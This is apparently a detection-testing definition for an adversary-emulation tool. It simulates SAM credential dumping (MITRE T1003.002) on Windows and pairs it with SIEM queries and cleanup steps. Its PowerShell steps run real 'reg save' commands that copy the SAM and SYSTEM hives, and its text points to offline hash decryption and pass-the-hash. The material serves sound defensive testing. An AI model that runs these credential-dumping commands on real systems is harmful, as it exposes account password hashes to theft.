id: T1003.002_os_credential_dumping_sam
name: "OS Credential Dumping — Security Account Manager"
mitre_technique: "T1003.002"
mitre_tactic: "credential_access"
description: >
  Adversaries dump the Security Account Manager (SAM) database to obtain local
  account NTLM hashes. The SAM stores local user credentials and is locked by the
  OS while running. Dump methods: reg save HKLM\SAM to copy the hive offline,
  Volume Shadow Copy Service to access locked files, or direct registry API with
  SYSTEM privileges. The SYSTEM hive is also needed to decrypt SAM entries.
  Dumped SAM hashes can be cracked offline or used directly for pass-the-hash attacks.
author: stanleytobias
created: "2026-01-01"
platform: windows
references:
  - https://attack.mitre.org/techniques/T1003/002/

steps:
  - step: 1
    type: marker
    description: "Pre-execution context"
    message: "Starting T1003.002 — SAM Database dump simulation"

  - step: 2
    type: exec_powershell
    description: "Simulate SAM hive export via reg save — generates Event ID 4663 and process telemetry"
    command: |
      Write-Host "[PAS] SAM dump via reg save simulation:"
      $samDump    = "$env:TEMP\PAS_T1003_002_SAM"
      $systemDump = "$env:TEMP\PAS_T1003_002_SYSTEM"

      # reg save of SAM requires SYSTEM — will fail as admin user; that's expected
      # The important thing is the command-line telemetry
      $proc = Start-Process reg.exe `
          -ArgumentList "save HKLM\SAM $samDump /y" `
          -PassThru -NoNewWindow -Wait -ErrorAction SilentlyContinue
      Write-Host "[PAS] reg save HKLM\SAM — exit code: $($proc?.ExitCode) (0=success, non-zero=insufficient privilege)"

      $proc2 = Start-Process reg.exe `
          -ArgumentList "save HKLM\SYSTEM $systemDump /y" `
          -PassThru -NoNewWindow -Wait -ErrorAction SilentlyContinue
      Write-Host "[PAS] reg save HKLM\SYSTEM — exit code: $($proc2?.ExitCode)"
      Write-Host "[PAS] Both SAM + SYSTEM required for offline decryption (impacket secretsdump)"

  - step: 3
    type: exec_powershell
    description: "Attempt to read SAM registry key — access check telemetry"
    command: |
      Write-Host "[PAS] SAM registry access attempt:"
      try {
          $sam = Get-ItemProperty "HKLM:\SAM\SAM\Domains\Account\Users" `
              -ErrorAction Stop
          Write-Host "[PAS] SAM registry readable — should NOT be accessible without SYSTEM"
      } catch {
          Write-Host "[PAS] SAM registry access denied (expected) — access attempt telemetry generated"
          Write-Host "[PAS] Event ID 4663: attempt to access SAM key should appear in Security log"
      }

  - step: 4
    type: sleep
    description: "Allow telemetry to flush"
    seconds: 3

  - step: 5
    type: marker
    description: "Post-execution prompt"
    message: "Check SIEM — reg.exe with 'save HKLM\\SAM' arguments, SAM/SYSTEM hive files in TEMP"

cleanup:
  - step: 1
    type: exec_powershell
    description: "Remove any exported hive files"
    command: |
      @("$env:TEMP\PAS_T1003_002_SAM",
        "$env:TEMP\PAS_T1003_002_SYSTEM") |
          ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
      Write-Host "[PAS][Cleanup] SAM dump artefacts removed"

  - step: 2
    type: marker
    description: "Cleanup complete"
    message: "T1003.002 cleanup complete"

analyst_checklist:
  - "Process event: reg.exe with 'save HKLM\\SAM' or 'save HKLM\\SYSTEM' arguments"
  - "File event: SAM or SYSTEM file created in non-system directory by reg.exe"
  - "Event ID 4663: object access audit on SAM registry key"
  - "Sentinel: DeviceProcessEvents | where FileName == 'reg.exe' and ProcessCommandLine contains 'SAM'"
  - "Sentinel: DeviceFileEvents | where FileName in ('SAM','SYSTEM') and FolderPath contains 'Temp'"
  - "MDE alert: 'SAM database access attempt'"
  - "CONTROL CHECK: SYSTEM privilege required for SAM — endpoint detection should alert on any process with SYSTEM attempting SAM read"
  - "CONTROL CHECK: LAPS — unique local admin passwords make SAM hash cracking less impactful"
